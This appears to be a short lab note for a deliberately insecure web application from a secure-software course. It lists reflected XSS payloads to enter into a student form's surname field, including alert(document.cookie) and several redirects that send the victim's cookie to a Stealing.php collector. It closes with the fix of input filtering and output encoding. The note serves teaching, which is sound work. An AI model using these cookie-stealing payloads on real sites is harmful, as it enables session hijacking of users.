InsecureWebApplicationProject ->V 1.0.0

Insert new student

-------input these messages to the textbox (soyadı) ----------

    <script>alert(document.cookie);</script>

    //<script>alert('xy');</script>

    //<script>window.location="http://localhost/SecureSoftwareDevelopment/Lecture4/2XSS/3ReflectedXSS/Stealing.php?cookie="+document.cookie; </script>
    //<script> window.location.href="./Stealing.php?cookie=\'+document.cookie </script>
       //<script>window.location.href="./Stealing.php?cookie="+document.cookie; </script>
     
window.location.href = "./Stealing.php?cookie="+document.cookie;
apply filtering and output encoding in set member functions (code reuse)